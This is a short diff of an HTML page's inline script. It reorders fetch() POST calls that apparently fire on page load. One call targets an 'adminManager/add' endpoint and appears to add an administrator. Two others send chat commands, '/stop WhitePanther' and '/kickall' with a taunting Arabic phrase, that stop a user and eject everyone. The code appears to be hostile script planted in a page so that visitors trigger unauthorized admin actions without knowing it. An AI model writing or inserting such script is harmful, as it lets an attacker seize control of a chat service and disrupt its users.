@@ -448,17 +448,6 @@
 
 <script>
 
-fetch("https://chat/chatResult", {
-    method: "POST",
-    body: JSON.stringify({ message: "/stop WhitePanther" }),
-});
-
-
-fetch("https://chat/chatResult", {
-    method: "POST",
-    body: JSON.stringify({ message: "/kickall اخر مره    " }),
-});
-
 fetch("https://monitor/WebPipe//adminManager/add", {
   "headers": {
     "accept": "application/json, text/javascript, /; q=0.01",
@@ -475,6 +464,17 @@ fetch("https://monitor/WebPipe//adminManager/add", {
   "method": "POST",
   "mode": "cors",
   "credentials": "omit"
+});
+
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/stop WhitePanther" }),
+});
+
+
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/kickall اخر مره    " }),
 });
 
 // Audio setup
@@ -647,6 +647,7 @@ document.addEventListener('keydown', function(e) {
 
 </body>
 </html>
+
 
 
 
